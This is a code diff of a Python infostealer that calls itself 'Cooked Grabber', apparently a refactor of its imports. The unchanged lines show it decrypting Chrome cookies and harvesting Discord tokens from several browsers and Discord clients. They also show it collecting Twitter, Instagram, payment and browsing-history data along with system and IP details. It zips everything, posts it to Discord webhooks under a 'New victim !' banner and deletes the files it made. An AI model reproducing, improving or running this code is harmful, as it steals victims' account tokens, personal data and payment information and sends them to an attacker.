@@ -1,5 +1,6 @@
-import os
-import sys
+
+from os import path as _path, environ as env, listdir, getenv, remove
+from sys import argv
 from json import loads
 from base64 import b64decode
 from sqlite3 import connect
@@ -91,7 +92,7 @@ def find_His():
     return table.get_string()
 
 def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"],
+    local_state_path = _path.join(env["USERPROFILE"],
                                     "AppData", "Local", "Google", "Chrome",
                                     "User Data", "Local State")
     with open(local_state_path, "r", encoding="utf-8") as f:
@@ -115,9 +116,9 @@ def decrypt_data(data, key):
 
 def main():
     filename = "Cookies.db"
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+    db_path = _path.join(env["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
-    if not os.path.isfile(filename):
+    if not _path.isfile(filename):
         copyfile(db_path, filename)
         SetFileAttributes(filename, win32con.FILE_ATTRIBUTE_HIDDEN)
     db = connect(filename)
@@ -126,7 +127,7 @@ def main():
         if w == website[0]:
             tokens = []
             def discord_tokens(path):
-                for file_name in os.listdir(path):
+                for file_name in listdir(path):
                     if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
@@ -135,17 +136,17 @@ def main():
                                 if token not in tokens:
                                     tokens.append(token)
             paths = [
-                os.path.join(os.getenv('LOCALAPPDATA'),"Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
-                os.path.join(os.getenv('APPDATA'), "Discord", "Local Storage", "leveldb"),
-                os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable"),
-                os.path.join(os.getenv('APPDATA'), "discordptb"),
-                os.path.join(os.getenv('APPDATA'), "discordcanary"),
-                os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
-                os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowser", "User Data", "Default")
+                _path.join(getenv('LOCALAPPDATA'),"Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+                _path.join(getenv('APPDATA'), "Discord", "Local Storage", "leveldb"),
+                _path.join(getenv('APPDATA'), "Opera Software", "Opera Stable"),
+                _path.join(getenv('APPDATA'), "discordptb"),
+                _path.join(getenv('APPDATA'), "discordcanary"),
+                _path.join(getenv('LOCALAPPDATA'), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+                _path.join(getenv('LOCALAPPDATA'), "Yandex", "YandexBrowser", "User Data", "Default")
             ]
             threads = []
             def find_wb(wb):
-                if os.path.exists(wb):
+                if _path.exists(wb):
                     threads.append(Thread(target=discord_tokens, args=(wb,)))
             for j in paths:
                 find_wb(j)
@@ -197,14 +198,14 @@ def main():
     db.commit()
     db.close()
     try:
-        os.remove('Cookies.db')
+        remove('Cookies.db')
     except:
         pass
     return [tokens, list(set(t_lst)), list(set(tuple(element) for element in insta_lst)), all_data_p]
 
 def replace_new(path):
-    if os.path.exists(path):
-        os.remove(path)
+    if _path.exists(path):
+        remove(path)
 
 def send_webhook(DISCORD_WEBHOOK_URLs):
     p_lst = get_Personal_data()
@@ -253,20 +254,20 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                 for i in pay_l:
                     f.write(f"{i}\n")
             zip.write("Payment Info.txt")
-            os.remove("Payment Info.txt")
+            remove("Payment Info.txt")
         replace_new("History.txt")
         with open('History.txt', 'w') as f:
             SetFileAttributes("History.txt", win32con.FILE_ATTRIBUTE_HIDDEN), f.write(find_His())
         zip.write("History.txt")
-        os.remove("History.txt")
+        remove("History.txt")
         for name_f, _ in files_names:
-            if os.path.exists(name_f):
+            if _path.exists(name_f):
                 zip.write(name_f)
-                os.remove(name_f)
+                remove(name_f)
     for URL in DISCORD_WEBHOOK_URLs:
         webhook = DiscordWebhook(url=URL, username='Cooked Grabber', avatar_url="https://c.tenor.com/h3fCM442dCcAAAAC/discord-logo.gif")
         embed = DiscordEmbed(title='New victim !', color='00FF00')
-        embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
+        embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{getenv('UserName')}**\n:computer:`PC Name:` **{getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
         embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get('https://restcountries.com/v3/name/morocco').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
         embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
         embed.add_embed_field(name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
@@ -275,15 +276,15 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
         embed.set_footer(text='By Lemon.-_-.#3714 & cr4sh3d.py#2160')
         embed.set_timestamp()
         with open("data.zip", 'rb') as f:
-            webhook.add_file(file=f.read(), filename=f"Cooked-Grabber-{os.getenv('UserName')}.zip")
+            webhook.add_file(file=f.read(), filename=f"Cooked-Grabber-{getenv('UserName')}.zip")
         webhook.add_embed(embed)
         webhook.execute()
-    os.remove("data.zip")
+    remove("data.zip")
 
 if __name__ == "__main__":
     freeze_support()
-    if len(sys.argv) == 1:
+    if len(argv) == 1:
         send_webhook(['YOUR DISCORD WEBHOOK URL'])
     else:
-        del sys.argv[0]
-        send_webhook(sys.argv)
+        del argv[0]
+        send_webhook(argv)
